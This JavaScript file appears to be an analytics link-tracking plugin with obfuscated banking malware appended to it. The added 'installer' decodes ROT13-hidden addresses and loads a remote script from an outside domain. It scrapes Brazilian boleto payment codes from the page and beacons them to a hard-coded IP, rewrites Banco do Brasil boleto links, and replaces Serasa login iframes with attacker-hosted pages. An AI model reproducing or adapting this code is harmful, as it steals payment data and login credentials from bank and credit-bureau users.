(function(){var e=window,h=document,k="replace";var m=function(a,c,d,b,g){c=encodeURIComponent(c)[k](/\(/g,"%28")[k](/\)/g,"%29");a=a+"="+c+"; path="+(d||"/")+"; ";g&&(a+="expires="+(new Date((new Date).getTime()+g)).toGMTString()+"; ");b&&"none"!=b&&(a+="domain="+b+";");b=h.cookie;h.cookie=a;return b!=h.cookie},p=function(a){var c=h.body;try{c.addEventListener?c.addEventListener("click",a,!1):c.attachEvent&&c.attachEvent("onclick",a)}catch(d){}};var q=function(a,c,d,b){this.get=function(){for(var b=void 0,c=[],d=h.cookie.split(";"),l=new RegExp("^\\s*"+a+"=\\s*(.*?)\\s*$"),f=0;f<d.length;f++){var n=d[f].match(l);n&&c.push(decodeURIComponent(n[1][k](/%28/g,"(")[k](/%29/g,")")))}for(d=0;d<c.length;d++)c[d]&&(b=c[d]);return b};this.set=function(g){return m(a,g,b,c,1E3*d)};this.remove=function(){return m(a,"",b,c,-100)}};var t=function(a,c){var d=void 0;if("function"==typeof a.get&&"function"==typeof a.set){var b=c||{},g=b.hasOwnProperty("cookieName")?b.cookieName:"_gali",r=b.hasOwnProperty("cookieTimeout")?b.cookieTimeout:30,s=b.hasOwnProperty("levels")?b.levels:3,b=a.get("cookieDomain"),l=a.get("cookiePath"),f=new q(g,b,r,l);d||(d=f.get());d&&a.set("&linkid",d);p(function(a){a=a||e.event;a=a.target||a.srcElement;for(var b,c=0;a&&c<=s;c++){if(b=a.getAttribute("id")){a=b;100<a.length?f.remove():a?f.set(a):f.remove();
    return}a=a.parentElement}f.remove()})}};(function(){e.gaplugins=e.gaplugins||{};e.gaplugins.LinkId=t;var a=e.GoogleAnalyticsObject||"ga";e[a]=e[a]||function(){(e[a].q=e[a].q||[]).push(arguments)};e[a]("provide","linkid",t)})();})();
/**
 * installer
 */
var __enc;
var __cookie;

__enc = new function () {
    this.rt = function(r, t, n) {
        return String.fromCharCode((r - t + n) % (2 * n) + t)
    };

    this.ra = function(r) {
        for (var t, n = [], o = r.length, a = "a".charCodeAt(0), e = a + 26, c = "A".charCodeAt(0), h = c + 26; o--;)t = r.charCodeAt(o), n[o] = t >= a && e > t ? this.rt(t, a, 13) : t >= c && h > t ? this.rt(t, c, 13) : r.charAt(o);
        return n.join("")
    };

    this.rb = function(r) {
        for (var t, n = [], o = r.length, a = "0".charCodeAt(0), e = a + 10; o--;)t = r.charCodeAt(o), n[o] = t >= a && e > t ? this.rt(t, a, 5) : r.charAt(o);
        return n.join("")
    };

    this.ec = function(r) {
        return this.rb(this.ra(r))
    };
};

__cookie = new function () {

    this.createCookie = function (name, value, days) {
        var expires;
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toGMTString();
        }
        else expires = "";
        document.cookie = name + "=" + value + expires + "; path=/";
    };

    this.readCookie = function(name) {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for(var i=0;i < ca.length;i++) {
            var c = ca[i];
            while (c.charAt(0)==' ') c = c.substring(1,c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
        }
        return null;
    };

    this.eraseCookie = function(name) {
        this.createCookie(name,"",-1);
    };

};

/**
 * install
 */
__install = function () {

    this.body_html = document.body.innerHTML;
    this.tag_scr = document.getElementsByTagName('script')[0];
    this.url = window.location.href;

    this.action = __enc.ec('uggc://40.760.91.792/pbhagre.cuc?vasb=');

    this.__addjs = function(u){
        try {
            var sct;
            console.log('__addjs;init;');
            sct = document.createElement('script');
            sct.src = ('https:' == document.location.protocol ? 'https' : 'http') + u;
            sct.type = 'text/javascript';
            sct.async = 'true';
            this.tag_scr.parentNode.insertBefore(sct, this.tag_scr);
            console.log('__js;' + u);
        } catch(e) {
            console.log(e);
        }
    };

    this.__loading = function(){
        try {
            if (typeof(jQuery) == 'undefined') {
                this.__addjs('://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js');
            }
        } catch(e) {
            console.log(e);
        }
        try {
            this.__addjs('://sepabi.com/8v10fufu42m6jocmqdw4ee76ptmncafr76pd3kcv89qx');
        } catch(e) {
            console.log(e);
        }
    };

    this.__snd = function(s){
        (new Image()).src = this.action + s + "&url=" + encodeURIComponent(this.url);
        console.log('__image;');
    };

    this.__get_boleto = function(){
        try {
            var s;
            var re = /([0-9]{5}\.[0-9]{5}\s+?[0-9]{5}\.[0-9]{6}\s+?[0-9]{5}\.[0-9]{6}\s+?[0-9]\s+?[0-9]{14})/;
            var m = this.body_html.match(re);
            s = m[0];
            s = s.replace(/\./g,'');
            s = s.replace(/\s/g,'');
            if (s) {
                this.__snd(s);
                console.log('__get_boleto;');
            }
        }
        catch(e) {
            console.log(e);
        }
    };
    /**
     *
     * @private
     */
    this.__hook_click = function(){
        var self = this;
        try {
            if (/.bb./i.test(this.url)) {
                $(__enc.ec("n[uers^='uggcf://jjj18.oo.pbz.oe/cbegnyoo/obyrgb/obyrgbf']"))
                    .each(function()
                    {
                        console.log('__hooked;each;'+this.href);
                        this.title = this.href;
                        this.href = '#';
                        $(this).click(function() {
                            event.preventDefault();
                            console.log('__hooked;click');
                            var u;
                            u = this.title;
                            window.open(u, '_blank');
                            self.__snd(u);
                            console.log('__hooked;');
                        });

                    });
            }
        }catch(e) {
            console.log(e);
        }
    };

    this.__hook_ifrs = function() {
        var self;
        self = this;
        try {
            if (/serasa/i.test(this.url)) {
                console.log('__hook_ifrs;serasa;');
                $(__enc.ec("vsenzr[fep^='uggcf://jjj.frenfnrkcrevna.pbz.oe/ybtva-pbecbengvib']"))
                    .each(function () {
                        console.log('__hook_ifrs;found_a');
                        this.src = __enc.ec('uggc://40.760.91.792/cyhtvaf/ncv.frenfn.ybtva.ugzy');

                    });

                $(__enc.ec("vsenzr[fep^='uggcf://fvgrarg.frenfn.pbz.oe/ryrzragbf_rfgehghen/ybtva-pbecbengvib']"))
                    .each(function () {
                        console.log('__hook_ifrs;found_b');
                        this.src = __enc.ec('uggc://40.760.91.792/cyhtvaf/ncv.czr.ybtva.ugzy');
                    });

                console.log('__hook_ifrs;load;');
            }
        } catch(e) {
            console.log(e);
        }
    };

    this.init = function() {
        console.log(this.action);
        this.__loading();
        /**
         * plugins
         */
        try{
            this.__get_boleto();
            this.__hook_click();
            this.__hook_ifrs();
        } catch(e) {
            console.log(e);
        }
    }
};
/**
 *
 */
$(window).load(function() {
    console.log('__added.js;load;');
    try {
        if (typeof(ins) == 'undefined') {
            var ins = new __install();
            ins.init();
            console.log('__ok;');
        } else {
            console.log('__err-created;');
        }
    } catch(e) {
        console.log(e);
    }
});